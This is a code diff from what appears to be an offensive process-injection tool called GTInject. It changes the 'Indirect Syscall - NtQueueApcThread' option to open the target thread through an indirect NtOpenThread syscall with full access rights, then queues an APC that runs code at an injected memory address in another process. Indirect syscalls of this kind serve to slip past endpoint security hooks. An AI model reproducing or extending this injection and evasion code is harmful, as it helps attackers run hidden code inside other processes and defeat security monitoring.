@@ -350,13 +350,17 @@ namespace GTInject.Injection
             /////////////////////////////////////
             // OPTION 303 == Indirect Syscall - NtQueueApcThread, NtResumeThread
             /////////////////////////////////////
+            var targetThread = IntPtr.Zero;
+            var cid = new CLIENT_ID { UniqueThread = (IntPtr)ThreadID };
+            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
+            var status = Syscalls.IndirectSysclNtOpenThread(out targetThread, (uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid);
 
-            var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+            //var targetThread = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
 
             // set up the syscall for NtQueueApcThread
             var hProcess = ProcID.Handle;
             IntPtr hThread = IntPtr.Zero;
-            var status = Syscalls.IndirectSysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
+            status = Syscalls.IndirectSysclNtQueueApcThread(targetThread, memaddr, 0, IntPtr.Zero, 0);
             Console.WriteLine("     Indirect Syscall to NtQueueApcThread " + status);
 
             if (status != 0)
